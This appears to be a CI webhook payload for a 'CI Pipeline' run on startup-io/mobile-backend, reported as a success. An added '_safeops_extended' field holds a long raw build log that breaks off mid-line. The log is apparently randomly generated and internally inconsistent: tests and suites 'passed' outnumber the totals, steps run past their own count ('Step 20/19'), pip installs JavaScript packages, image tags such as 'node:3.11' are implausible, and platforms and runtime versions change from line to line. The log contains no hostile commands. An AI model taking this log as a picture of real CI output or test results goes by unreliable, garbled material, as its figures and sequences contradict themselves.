{
  "action": "completed",
  "workflow_run": {
    "id": 256,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-274",
    "head_sha": "0f6c7020b3e113910f0bf2561b49e223b6330313",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-14T12:46:23.644472Z",
    "updated_at": "2025-12-14T12:49:39.871882Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\nEnvironment: staging\nPulling image: alpine:latest\n[12:46:23] WARN: Deprecated API usage\nLayer 3/13: RUN command\npip: Downloading axios-2.7.tar.gz\nLayer 8/13: ENV command\n[12:46:23] INFO: Connecting to database\n  PASS: integration/test_api_health.spec.js\nCache hit for key-8984\n  PASS: test_auth_login (206ms)\n  PASS: integration/test_api_health.spec.js\nTime: 102.424s\nBuilding Docker image...\n\u2713 Step 'test' succeeded\nnpm notice: package.json updated\nCompiling utils/app.ts...\nPulling image: alpine:latest\nPulling image: python:3.11\nnpm notice: created a lockfile\nInstalling webpack@2.11.10\nTransforming 826 files...\n[12:46:23] WARN: Deprecated API usage\nUsing Node.js 15.10.0\nRan 76 tests in 7s\nCompiling src/handler.rs...\nChecking out master branch\nReady.\nUploading artifact 'coverage' (45 files)\nPlatform: win32-x64\nWARNING: axios has known vulnerabilities\nWaiting...\nyarn add: Done in 6.45s\nCompiling components/service.java...\nCache hit for key-4657\n[12:46:23] DEBUG: Memory usage: 1145MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: dependencies\nFetching from https://npmjs.org/package.json\nnpm notice: package.json updated\nCompleted.\nCreating production build...\nMinifying vendor.js\nLayer 8/10: RUN command\nCache hit for key-1658\nVerifying...\nCoverage: 90% statements, 61% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (84ms)\n[12:46:23] ERROR: Connection failed\npip: Downloading express-3.0.tar.gz\nCache saved successfully\nBundling runtime.js\nException: RuntimeError\nStep 12/21: Testing\n[12:46:23] INFO: Connecting to database\nArtifact uploaded: dist.zip (56MB)\nOptimizing 94 modules...\nImage pulled successfully\n[12:46:23] INFO: Starting build process\n\u2713 build completed\nHEAD is now at 4dbe987\n[12:46:23] INFO: Connecting to database\nCache restored successfully (346MB)\n[12:46:23] DEBUG: Query executed in 87ms\nUsing Node.js 18.14.0\n\u2713 Task completed in 375ms\n[12:46:23] INFO: Starting build process\nStep 7/24: Building\npip: Collecting jest\nMinifying main.js\nChecking out develop branch\n\u2713 validate completed\nImage pulled successfully\nCompiling lib/main.py...\n\u2717 build failed with exit code 58\nHEAD is now at a1f7bba\nPOST /upload - 200 (300ms)\nStep 5/15: Running migrations\nLoading...\nCompiling lib/utils.go...\nnpm install: resolved 252 packages\nStep 2/23: Testing\nSuccess!\nFinished.\nnpm notice: package.json updated\npip: Collecting jest\nnpm install: resolved 1749 packages\n\u2713 Step 'setup' succeeded\nChecking out develop branch\nWARNING: jest has known vulnerabilities\nCompiling components/service.java...\nCoverage: 90% statements, 83% branches\n\u2713 All checks passed\nUploading artifact 'dist' (32 files)\nyarn add: Done in 29.77s\n[12:46:23] ERROR: Connection failed\nCompiling components/main.py...\nTLS handshake completed\nArtifact uploaded: build.tar.gz (36MB)\nPOST /api - 200 (19ms)\nRan 10 tests in 5s\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] DEBUG: Memory usage: 1682MB\nWARNING: react has known vulnerabilities\nTransforming 537 files...\n\u2717 build failed with exit code 94\nTime: 46.711s\nPulling image: alpine:18\nPOST /data - 201 (407ms)\nDone.\nTLS handshake completed\nCache restored successfully (145MB)\nTime: 26.913s\nGET /status - 200 (30ms)\n[12:46:23] DEBUG: Memory usage: 803MB\nMinifying vendor.js\nSuccess!\n[12:46:23] DEBUG: Connection pool: 11 active\n[12:46:23] INFO: Request completed\nWARNING: jest has known vulnerabilities\nMinifying app.js\nOptimizing 92 modules...\n[12:46:23] ERROR: Connection failed\nWARNING: lodash has known vulnerabilities\nCompiling lib/handler.rs...\n[12:46:23] DEBUG: Memory usage: 554MB\npip: Downloading express-5.9.tar.gz\nCompiling src/service.java...\nGenerating source maps...\nPulling image: node:18\nnpm install: added 376 packages\nStep 2/18: Testing\nWARNING: webpack has known vulnerabilities\nInstalling axios@4.13.5\nnpm install: resolved 1108 packages\nSnapshots: 47 passed, 10 total\nCoverage: 89% statements, 70% branches\nFetching submodules...\nReady.\npip install: Successfully installed lodash-5.15\nTime: 44.318s\npip install: Successfully installed react-1.8\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (8MB)\n[12:46:23] DEBUG: Initializing service\nnpm notice: created a lockfile\nVerifying...\n[12:46:23] WARN: Deprecated API usage\nBuilding Docker image...\nImage pulled successfully\nStep 9/20: Building\nOptimizing 18 modules...\nInstalling lodash@1.16.10\nnpm install: resolved 517 packages\nPushing to registry...\nnpm notice: created a lockfile\nAlready up to date.\nTest Suites: 16 passed, 6 total\n[12:46:23] DEBUG: Query executed in 80ms\nFinished.\n\u2717 build failed with exit code 89\nBuilding Docker image...\npip: Downloading lodash-2.13.tar.gz\nCompleted.\nCache restored successfully (49MB)\nProcessing...\nProcessing...\nTLS handshake completed\nnpm notice: created a lockfile\nPOST /api - 201 (135ms)\n[12:46:23] INFO: Connecting to database\nStep 19/23: Deploying\n\u2713 All checks passed\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nImage pulled successfully\nRan 149 tests in 38s\npip: Collecting lodash\nArtifact downloaded: 11MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: prettier has known vulnerabilities\nCache miss for key-4531\nWARNING: express has known vulnerabilities\nCoverage: 98% statements, 93% branches\n\u2713 All checks passed\n\u2713 deploy completed\n[12:46:23] INFO: Request completed\n[12:46:23] DEBUG: Query executed in 88ms\n\u2713 Task completed in 1565ms\n  PASS: e2e/test_cache_hit.spec.js\nPlatform: linux-x64\nTests: 118 passed, 120 total\nOptimizing 75 modules...\nGET /status - 200 (73ms)\nFetching submodules...\n\u2713 Task completed in 3370ms\n[12:46:23] DEBUG: Memory usage: 1407MB\n[12:46:23] DEBUG: Initializing service\nPOST /data - 202 (357ms)\nProcessing...\nGenerating source maps...\nUploading artifact 'coverage' (36 files)\nUsing Node.js 19.15.0\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] INFO: Starting build process\nWARNING: axios has known vulnerabilities\nMinifying vendor.js\n[12:46:23] DEBUG: Memory usage: 1785MB\n[12:46:23] DEBUG: Loading configuration\nCreating production build...\nMinifying vendor.js\nProcessing...\nSwitched to branch 'hotfix/task-648'\nFetching submodules...\nStep 5/23: Testing\nUploading artifact 'dist' (31 files)\nFinished.\nPulling image: node:3.11\nCoverage: 79% statements, 70% branches\nPlatform: win32-x64\n[12:46:23] INFO: Starting build process\nFetching from https://npmjs.org/package.json\n[12:46:23] INFO: Request completed\nStep 10/24: Building\n[12:46:23] INFO: Starting build process\nGET /api - 201 (2ms)\npip: Collecting eslint\nnpm install: added 185 packages\nOptimizing 75 modules...\nInstalling eslint@3.19.5\nWaiting...\nArtifact downloaded: 34MB\n[12:46:23] DEBUG: Query executed in 40ms\n\u2713 deploy completed\nException: RuntimeError\nFetching submodules...\nException: TypeError\nCompiling components/app.ts...\nStep 11/24: Deploying\n\u2717 build failed with exit code 56\nArtifact downloaded: 31MB\nFetching from https://pypi.org/package.json\nCompiling lib/handler.rs...\nFetching submodules...\nFetching submodules...\npip: Installing build dependencies...\nSnapshots: 10 passed, 13 total\nWARNING: express has known vulnerabilities\nConnection established\nOK\nArtifact uploaded: build.tar.gz (31MB)\nOptimizing 90 modules...\n\u2713 package completed\n[12:46:23] INFO: Connecting to database\npip: Installing build dependencies...\nSuccess!\nWARNING: react has known vulnerabilities\nFetching from https://github.com/package.json\nConnection established\nReady.\nOptimizing 41 modules...\nBundling styles.css\nnpm notice: created a lockfile\nSwitched to branch 'bugfix/task-723'\nTime: 118.927s\n[12:46:23] DEBUG: Initializing service\nCompiling src/handler.rs...\nException: ValueError\nnpm notice: package.json updated\nnpm install: resolved 673 packages\nSnapshots: 20 passed, 22 total\nCache miss for key-4345\nCompiling components/utils.go...\n[12:46:23] DEBUG: Connection pool: 19 active\nConnection established\nPulling image: alpine:3.11\nTransforming 420 files...\n  PASS: integration/test_auth_login.spec.js\nStep 5/16: Testing\n[12:46:23] WARN: Deprecated API usage\nnpm notice: package.json updated\nPushing to registry...\n[12:46:23] INFO: Cache refreshed\nBuilding Docker image...\nEnvironment: development\nArtifact uploaded: dist.zip (100MB)\nLoading...\nGenerating source maps...\nPlatform: darwin-arm64\nCache restored successfully (323MB)\n[12:46:23] DEBUG: Query executed in 30ms\nWARNING: webpack has known vulnerabilities\n\u2713 Step 'build' succeeded\n[12:46:23] WARN: Deprecated API usage\nAlready up to date.\n[12:46:23] DEBUG: Query executed in 8ms\nFinished.\nnpm notice: package.json updated\n\u2717 build failed with exit code 4\nConnection established\n[12:46:23] DEBUG: Loading configuration\nCompiling src/main.py...\nDone.\nnpm notice: created a lockfile\nStep 3/19: Installing dependencies\nCache restored successfully (445MB)\nArtifact uploaded: build.tar.gz (17MB)\nNODE_ENV=test\npip: Downloading react-4.14.tar.gz\nCompiling utils/main.py...\npip install: Successfully installed eslint-2.16\nPOST /api - 200 (166ms)\nSwitched to branch 'feature/task-555'\nLayer 8/9: COPY command\nConnection established\nCompiling components/utils.go...\nWaiting...\nCache hit for key-6903\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] WARN: Deprecated API usage\nnpm notice: created a lockfile\nFetching submodules...\nCache invalidated: build\nNODE_ENV=development\nWaiting...\nNODE_ENV=development\n[12:46:23] DEBUG: Memory usage: 1175MB\nnpm notice: created a lockfile\nProcessing...\nException: TypeError\nPushing to registry...\n[12:46:23] DEBUG: Connection pool: 15 active\nTLS handshake completed\nStep 18/18: Running migrations\nnpm install: resolved 1235 packages\n\u2713 All checks passed\nCache saved successfully\n\u2713 Task completed in 258ms\nCompleted.\nStep 5/16: Installing dependencies\n\u2717 build failed with exit code 19\nGET /status - 204 (24ms)\nCompleted.\nStep 18/20: Building\nCompiling components/index.js...\n[12:46:23] DEBUG: Connection pool: 17 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\n=== Step install_dependencies completed ===\n=== Step: type_check ===\nSnapshots: 43 passed, 35 total\nOptimizing 87 modules...\n\u2713 All checks passed\nCompiling utils/main.py...\nLoading...\nProcessing...\nEnvironment: test\nRan 100 tests in 48s\nFinished.\nStep 2/15: Running migrations\nCache hit for key-8403\nStep 1/16: Linting\nCompiling components/handler.rs...\nCache miss for key-9963\nCompiling src/utils.go...\npip: Collecting react\nBundling runtime.css\nStep 17/18: Deploying\nWARNING: express has known vulnerabilities\nTest Suites: 19 passed, 40 total\nArtifact uploaded: build.tar.gz (37MB)\nBundling runtime.css\n[12:46:23] INFO: Request completed\nStep 19/18: Testing\nRan 158 tests in 21s\nCompleted.\nnpm notice: created a lockfile\n\u2713 Step 'setup' succeeded\nDone.\nCoverage: 72% statements, 70% branches\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (7MB)\nnpm notice: created a lockfile\nUploading artifact 'build' (31 files)\nGET /status - 201 (12ms)\nProcessing...\n[12:46:23] DEBUG: Initializing service\nVerifying...\nProcessing...\n[12:46:23] DEBUG: Loading configuration\nFetching submodules...\nOK\nOptimizing 53 modules...\nChecking out main branch\nTests: 82 passed, 211 total\nPushing to registry...\nTest Suites: 42 passed, 31 total\nFAILED: test_db_connect\nOK\nTests: 498 passed, 391 total\n[12:46:23] DEBUG: Query executed in 40ms\nFetching submodules...\nFetching submodules...\nWARNING: jest has known vulnerabilities\nTests: 284 passed, 477 total\nTest Suites: 22 passed, 48 total\npip: Downloading express-4.11.tar.gz\npip: Collecting eslint\nTLS handshake completed\n[12:46:23] DEBUG: Connection pool: 15 active\npip: Installing build dependencies...\nCache miss for key-6805\nSuccess!\n[12:46:23] DEBUG: Initializing service\nHEAD is now at 1011579\nTests: 251 passed, 133 total\nEnvironment: test\nWARNING: webpack has known vulnerabilities\nSnapshots: 5 passed, 25 total\nPlatform: win32-x64\nCreating production build...\npip: Collecting eslint\nMinifying app.js\nCoverage: 88% statements, 61% branches\nCompiling src/main.py...\nAlready up to date.\nnpm notice: created a lockfile\nCache hit for key-3215\nnpm install: resolved 1036 packages\n[12:46:23] DEBUG: Memory usage: 678MB\nStep 3/20: Installing dependencies\nChecking out main branch\nSuccess!\n  PASS: unit/test_user_create.spec.js\nRan 105 tests in 46s\nGET /api - 201 (34ms)\nTransforming 437 files...\nPOST /api - 202 (141ms)\n[12:46:23] INFO: Processing request\nStep 4/25: Deploying\nUsing Node.js 19.4.1\nWARNING: jest has known vulnerabilities\nPushing to registry...\nnpm install: added 383 packages\nDone.\nTest Suites: 16 passed, 33 total\nyarn add: Done in 26.4s\nSnapshots: 7 passed, 38 total\nBuilding Docker image...\nPOST /upload - 200 (387ms)\n\u2717 build failed with exit code 88\nTLS handshake completed\nOptimizing 30 modules...\nBuilding Docker image...\nnpm install: added 74 packages\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] WARN: Deprecated API usage\nPlatform: linux-x64\nTime: 99.75s\nCache restored successfully (85MB)\nSuccess!\nInstalling express@4.12.7\nPulling image: node:latest\nCompleted.\nTransforming 924 files...\nStep 10/20: Testing\nEnvironment: development\n[12:46:23] DEBUG: Connection pool: 15 active\n[12:46:23] ERROR: Connection failed\nCache hit for key-6473\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] DEBUG: Query executed in 46ms\nChecking out master branch\nArtifact downloaded: 29MB\nSuccess!\nCompleted.\nCompleted.\n[12:46:23] DEBUG: Initializing service\n[12:46:23] DEBUG: Memory usage: 587MB\nnpm install: resolved 1000 packages\nTLS handshake completed\nGenerating source maps...\nArtifact uploaded: dist.zip (8MB)\n[12:46:23] DEBUG: Query executed in 96ms\nCache invalidated: dependencies\nFinished.\n[12:46:23] INFO: Request completed\nCompiling utils/service.java...\nInstalling react@4.15.3\nStep 8/22: Deploying\nNODE_ENV=production\nCompiling src/service.java...\nCoverage: 84% statements, 72% branches\n\u2713 Task completed in 640ms\nPOST /upload - 202 (197ms)\nSwitched to branch 'hotfix/task-587'\nStep 6/15: Deploying\n[12:46:23] ERROR: Connection failed\n[12:46:23] DEBUG: Connection pool: 8 active\nConnection established\n[12:46:23] DEBUG: Initializing service\n\u2713 package completed\nUsing Node.js 14.6.7\nCache hit for key-4220\nLoading...\nFetching from https://registry.npmjs.org/package.json\nWARNING: axios has known vulnerabilities\n[12:46:23] DEBUG: Loading configuration\nPushing to registry...\nEnvironment: development\nnpm install: resolved 779 packages\n\u2717 build failed with exit code 16\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 22 tests in 35s\nnpm notice: created a lockfile\nNODE_ENV=production\nLoading...\nCoverage: 98% statements, 84% branches\nGET /status - 204 (6ms)\nUploading artifact 'dist' (45 files)\nCache invalidated: dependencies\nCache invalidated: build\n[12:46:23] DEBUG: Loading configuration\n=== Step type_check completed ===\n=== Step: setup_node ===\nTest Suites: 34 passed, 45 total\nCache restored successfully (320MB)\nArtifact downloaded: 39MB\n[12:46:23] DEBUG: Connection pool: 6 active\nCache invalidated: build\nFinished.\nSwitched to branch 'feature/task-807'\nCache saved successfully\nConnection established\n[12:46:23] INFO: Cache refreshed\nnpm notice: package.json updated\nBuilding Docker image...\nOptimizing 86 modules...\npip: Collecting webpack\npip: Downloading eslint-3.13.tar.gz\nArtifact uploaded: dist.zip (72MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: prettier has known vulnerabilities\nCoverage: 88% statements, 68% branches\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:23] ERROR: Connection failed\nInstalling eslint@4.20.2\nLayer 6/15: ENV command\nCompleted.\nDone.\n  PASS: integration/test_db_connect.spec.js\nWARNING: jest has known vulnerabilities\nyarn add: Done in 25.78s\nCache hit for key-4816\nChecking out master branch\nWARNING: express has known vulnerabilities\n[12:46:23] DEBUG: Memory usage: 470MB\nCache miss for key-3248\nFetching from https://amazonaws.com/package.json\nCompiling src/main.py...\nStep 4/15: Deploying\nArtifact uploaded: dist.zip (72MB)\nTLS handshake completed\nAlready up to date.\nStep 18/18: Deploying\nTest Suites: 32 passed, 40 total\nWARNING: eslint has known vulnerabilities\nStep 2/23: Running migrations\nStep 20/19: Building\nStep 5/23: Linting\nBuilding Docker image...\npip install: Successfully installed webpack-5.20\nUsing Node.js 20.3.10\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:23] INFO: Connecting to database\nPlatform: darwin-arm64\npip: Installing build dependencies...\n[12:46:23] INFO: Cache refreshed\nWARNING: eslint has known vulnerabilities\nCompiling lib/service.java...\nConnection established\nCompiling utils/app.ts...\nStep 13/20: Building\nFinished.\nBundling main.js\nSwitched to branch 'bugfix/task-901'\nOK\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nSnapshots: 19 passed, 20 total\nSuccess!\nStep 3/16: Building\nSuccess!\n[12:46:23] DEBUG: Connection pool: 19 active\nPulling image: node:3.11\nLoading...\nStep 10/16: Running migrations\nUsing Node.js 18.10.3\nReady.\nStep 12/15: Deploying\nPulling image: python:3.11\nPlatform: linux-x64\nPulling image: node:latest\nOK\nGenerating source maps...\n[12:46:23] DEBUG: Query executed in 47ms\nBuilding Docker image...\n[12:46:23] WARN: Deprecated API usage\nEnvironment: test\nChecking out main branch\nCreating production build...\n[12:46:23] DEBUG: Query executed in 64ms\npip install: Successfully installed react-5.18\nStep 5/20: Testing\nCompiling lib/app.ts...\nCoverage: 92% statements, 94% branches\n[12:46:23] DEBUG: Query executed in 46ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\nFetching submodules...\nCache invalidated: node_modules\nFinished.\nGET /api - 204 (60ms)\nnpm notice: package.json updated\n[12:46:23] DEBUG: Memory usage: 1849MB\nChecking out master branch\nVerifying...\nSwitched to branch 'bugfix/task-611'\nStep 13/24: Building\nNODE_ENV=development\nArtifact uploaded: build.tar.gz (25MB)\n[12:46:23] DEBUG: Connection pool: 10 active\nUsing Node.js 17.18.7\nnpm notice: package.json updated\nStep 3/16: Installing dependencies\npip: Collecting webpack\n[12:46:23] WARN: Deprecated API usage\nStep 14/18: Installing dependencies\n[12:46:23] INFO: Processing request\nTest Suites: 44 passed, 35 total\nTransforming 832 files...\nFetching submodules...\nTest Suites: 45 passed, 16 total\nCache invalidated: build\nWARNING: prettier has known vulnerabilities\nUploading artifact 'dist' (6 files)\nGenerating source maps...\nSnapshots: 8 passed, 46 total\nSwitched to branch 'bugfix/task-922'\npip install: Successfully installed jest-2.17\nAlready up to date.\nConnection established\nStep 12/17: Linting\nFinished.\n\u2713 All checks passed\nWaiting...\npip install: Successfully installed eslint-4.19\nProcessing...\nCompiling utils/utils.go...\nBuilding Docker image...\nProcessing...\nStep 3/17: Testing\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\nOptimizing 93 modules...\nTime: 87.483s\n[12:46:23] WARN: Deprecated API usage\nTime: 72.87s\n[12:46:23] INFO: Cache refreshed\nArtifact downloaded: 32MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: python:18\n[12:46:23] DEBUG: Initializing service\nTests: 328 passed, 437 total\n[12:46:23] INFO: Request completed\nConnection established\nSwitched to branch 'hotfix/task-555'\nDone.\n[12:46:23] INFO: Starting build process\nSuccess!\nInstalling eslint@2.2.2\nInstalling jest@1.9.2\nyarn add: Done in 23.38s\nCompiling src/utils.go...\nReady.\nStep 6/15: Deploying\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] WARN: Deprecated API usage\nyarn add: Done in 23.10s\nCompiling utils/handler.rs...\nCoverage: 88% statements, 71% branches\nWARNING: jest has known vulnerabilities\n[12:46:23] WARN: Deprecated API usage\nFAILED: test_db_connect\n=== Step setup_node completed ===\n=== Step: build ===\npip install: Successfully installed prettier-4.16\nCompiling utils/service.java...\nCompiling utils/service.java...\nChecking out main branch\nUsing Python 3.12\nCompiling src/index.js...\n[12:46:23] INFO: Request completed\nStep 20/21: Running migrations\n[12:46:23] INFO: Processing request\n\u2713 Step 'setup' succeeded\nPlatform: win32-x64\nFAILED: test_cache_hit\n[12:46:23] INFO: Connecting to database\n  PASS: e2e/test_db_connect.spec.js\nPlatform: linux-x64\nnpm install: resolved 1957 packages\nUsing Python 3.12\n  PASS: e2e/test_auth_login.spec.js\nTLS handshake completed\n  PASS: test_api_health (15ms)\nSnapshots: 33 passed, 16 total\nCache saved successfully\nBundling vendor.js\nGET /api - 200 (79ms)\nTLS handshake completed\n[12:46:23] DEBUG: Query executed in 59ms\nArtifact downloaded: 50MB\npip: Collecting jest\nPushing to registry...\nNODE_ENV=test\n  PASS: unit/test_cache_hit.spec.js\nUsing Python 3.10\n\u2713 Step 'build' succeeded\nCompiling components/handler.rs...\npip: Installing build dependencies...\nHEAD is now at e4902c9\nOptimizing 97 modules...\n\u2713 deploy completed\nStep 8/21: Testing\nyarn add: Done in 28.73s\n\u2713 Task completed in 118ms\nDone.\nnpm notice: package.json updated\nCompiling components/index.js...\n[12:46:23] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\nMinifying app.js\nnpm install: resolved 424 packages\nGET /api - 201 (30ms)\n[12:46:23] DEBUG: Query executed in 70ms\nGET /health - 201 (52ms)\nnpm notice: created a lockfile\n\u2713 Step 'test' succeeded\nCompiling components/service.java...\nDone.\nnpm install: resolved 1606 packages\nAlready up to date.\nyarn add: Done in 9.42s\nRan 141 tests in 34s\n\u2713 All checks passed\n[12:46:23] DEBUG: Connection pool: 13 active\nCoverage: 91% statements, 62% branches\npip: Collecting lodash\nProcessing...\nSnapshots: 35 passed, 14 total\npip install: Successfully installed react-3.1\nStep 15/19: Running migrations\nMinifying vendor.js\nCache invalidated: dependencies\nFetching submodules...\nCache hit for key-3540\nUsing Python 3.10\nConnection established\nStep 5/16: Building\nInstalling eslint@3.14.1\nStep 4/17: Deploying\nMinifying app.js\nStep 3/25: Building\nStep 1/19: Running migrations\nEnvironment: production\nLayer 5/9: RUN command\nHEAD is now at 84b9512\nGenerating source maps...\nWARNING: express has known vulnerabilities\npip: Downloading eslint-4.15.tar.gz\nPushing to registry...\nPlatform: linux-x64\nTransforming 674 files...\n[12:46:23] INFO: Cache refreshed\nCompiling components/handler.rs...\nnpm install: added 304 packages\n  PASS: e2e/test_user_create.spec.js\nArtifact uploaded: dist.zip (74MB)\nUsing Python 3.11\nSuccess!\nDone.\nImage pulled successfully\nEnvironment: production\n[12:46:23] INFO: Request completed\n  PASS: test_api_health (480ms)\n[12:46:23] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\nStep 7/25: Linting\nStep 6/16: Running migrations\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nPulling image: python:18\nWARNING: jest has known vulnerabilities\nGET /api - 201 (47ms)\nLoading...\nVerifying...\nnpm install: resolved 1236 packages\nnpm install: resolved 1637 packages\nCoverage: 80% statements, 75% branches\n[12:46:23] INFO: Processing request\nSnapshots: 26 passed, 18 total\nWARNING: axios has known vulnerabilities\n[12:46:23] DEBUG: Connection pool: 12 active\nDone.\nConnection established\nOptimizing 85 modules...\nSnapshots: 9 passed, 37 total\n[12:46:23] WARN: Deprecated API usage\nMinifying vendor.js\n  PASS: test_db_connect (122ms)\n\u2713 Task completed in 4523ms\nOK\n[12:46:23] DEBUG: Memory usage: 1928MB\nnpm install: added 191 packages\nyarn add: Done in 26.10s\nAlready up to date.\n[12:46:23] WARN: Deprecated API usage\nUsing Python 3.10\nWARNING: react has known vulnerabilities\nTime: 60.84s\nAlready up to date.\nGenerating source maps...\nPushing to registry...\nFAILED: test_api_health\nGenerating source maps...\n[12:46:23] DEBUG: Loading configuration\nCompiling utils/service.java...\n[12:46:23] INFO: Processing request\nFetching submodules...\nFetching from https://gcr.io/package.json\nStep 14/16: Deploying\npip: Downloading eslint-4.3.tar.gz\nCompiling utils/index.js...\nPushing to registry...\nPushing to registry...\nException: RuntimeError\nReady.\n[12:46:23] DEBUG: Connection pool: 9 active\nStep 14/24: Deploying\nAlready up to date.\n[12:46:23] DEBUG: Initializing service\npip install: Successfully installed react-4.17\n  PASS: e2e/test_auth_login.spec.js\nTime: 75.932s\nUsing Python 3.10\npip: Installing build dependencies...\nCompiling src/index.js...\nChecking out main branch\nUsing Python 3.10\n  PASS: e2e/test_db_connect.spec.js\n[12:46:23] WARN: Deprecated API usage\nStep 14/16: Installing dependencies\nTLS handshake completed\nAlready up to date.\nCache restored successfully (127MB)\nCache restored successfully (152MB)\nUsing Node.js 16.12.5\n=== Step build completed ===\n=== Step: upload_artifacts ===\nChecking out master branch\n[12:46:23] DEBUG: Connection pool: 9 active\n[12:46:23] INFO: Processing request\nHEAD is now at e4f83b2\nDone.\n[12:46:23] DEBUG: Initializing service\nPlatform: win32-x64\nCreating production build...\nBundling vendor.js\nNODE_ENV=test\npip: Installing build dependencies...\nReady.\nnpm install: resolved 1725 packages\n  PASS: test_api_health (273ms)\n[12:46:23] INFO: Processing request\nMinifying vendor.js\nWARNING: eslint has known vulnerabilities\nPushing to registry...\nProcessing...\nCreating production build...\nImage pulled successfully\nStep 10/24: Installing dependencies\nArtifact uploaded: build.tar.gz (34MB)\n[12:46:23] INFO: Connecting to database\nReady.\n[12:46:23] INFO: Request completed\nStep 15/22: Linting\nCache saved successfully\nGenerating source maps...\nSwitched to branch 'hotfix/task-782'\nCompiling lib/index.js...\nCache saved successfully\nConnection established\nLayer 10/13: COPY command\nUploading artifact 'coverage' (32 files)\nStep 15/21: Linting\n\u2713 Task completed in 3190ms\nCompiling components/service.java...\n[12:46:23] DEBUG: Initializing service\nFAILED: test_user_create\npip: Downloading eslint-1.19.tar.gz\nRan 92 tests in 25s\n\u2713 All checks passed\nMinifying main.js\nCreating production build...\nPushing to registry...\n[12:46:23] DEBUG: Query executed in 56ms\nArtifact uploaded: dist.zip (94MB)\n\u2717 build failed with exit code 100\nUsing Python 3.11\n[12:46:23] DEBUG: Loading configuration\n[12:46:23] INFO: Cache refreshed\nInstalling webpack@1.14.5\nyarn add: Done in 28.50s\n[12:46:23] INFO: Connecting to database\n[12:46:23] DEBUG: Loading configuration\n[12:46:23] DEBUG: Query executed in 71ms\nSuccess!\nBuilding Docker image...\nCompiling lib/index.js...\nVerifying...\nRan 75 tests in 53s\nDone.\nOptimizing 74 modules...\nLayer 4/13: ENV command\nInstalling axios@5.11.1\nUploading artifact 'build' (29 files)\nWARNING: prettier has known vulnerabilities\n[12:46:23] WARN: Deprecated API usage\nGET /health - 200 (21ms)\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:23] INFO: Processing request\nCache miss for key-5865\n[12:46:23] INFO: Processing request\n[12:46:23] INFO: Request completed\nSwitched to branch 'bugfix/task-449'\nChecking out main branch\nReady.\n[12:46:23] INFO: Processing request\nReady.\n[12:46:23] DEBUG: Initializing service\n[12:46:23] INFO: Starting build process\nFAILED: test_db_connect\nStep 14/15: Testing\nEnvironment: production\n[12:46:23] INFO: Cache refreshed\n[12:46:23] INFO: Connecting to database\nSwitched to branch 'feature/task-595'\n\u2713 Step 'build' succeeded\nStep 6/21: Linting\nArtifact downloaded: 1MB\nStep 9/22: Running migrations\nTests: 129 passed, 300 total\nStep 9/22: Building\npip: Downloading react-1.6.tar.gz\nCreating production build...\n[12:46:23] DEBUG: Initializing service\nStep 18/15: Installing dependencies\nStep 8/20: Deploying\nStep 1/24: Building\nCache hit for key-7589\nNODE_ENV=development\nPOST /upload - 201 (302ms)\nCache hit for key-4421\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\nProcessing...\nCompiling src/index.js...\nInstalling axios@2.5.9\nTime: 117.954s\n  PASS: test_api_health (207ms)\nFAILED: test_cache_hit\n[12:46:23] DEBUG: Connection pool: 6 active\nPushing to registry...\nNODE_ENV=development\nOK\nSuccess!\nnpm notice: package.json updated\nStep 12/21: Testing\nUsing Node.js 18.15.8\nWaiting...\nFetching submodules...\n[12:46:23] DEBUG: Initializing service\nLayer 5/8: COPY command\n[12:46:23] WARN: Deprecated API usage\nMinifying vendor.js\nnpm install: added 366 packages\nBuilding Docker image...\n[12:46:23] DEBUG: Query executed in 64ms\n[12:46:23] DEBUG: Loading configuration\nTests: 70 passed, 253 total\nOK\n[12:46:23] WARN: Deprecated API usage\nStep 6/19: Deploying\nStep 17/20: Running migrations\nStep 6/18: Running migrations\nArtifact downloaded: 47MB\nWaiting...\nChecking out develop branch\nCoverage: 97% statements, 95% branches\nArtifact uploaded: dist.zip (12MB)\n\u2713 All checks passed\nWARNING: eslint has known vulnerabilities\nWaiting...\nnpm install: added 104 packages\n[12:46:23] INFO: Starting build process\nArtifact downloaded: 12MB\nGenerating source maps...\nGenerating source maps...\nFAILED: test_db_connect\n  PASS: test_db_connect (4ms)\nCompiling utils/handler.rs...\nUsing Python 3.9\nCreating production build...\nUsing Python 3.12\nBundling vendor.css\n[12:46:23] INFO: Request completed\nTest Suites: 38 passed, 37 total\nStep 12/21: Linting\nUsing Python 3.9\nStep 15/21: Building\nArtifact uploaded: dist.zip (38MB)\npip: Collecting eslint\nCompiling utils/main.py...\nSwitched to branch 'hotfix/task-118'\nPOST /api - 202 (20ms)\nCoverage: 85% statements, 85% branches\npip install: Successfully installed react-5.6\nStep 14/17: Testing\nnpm notice: 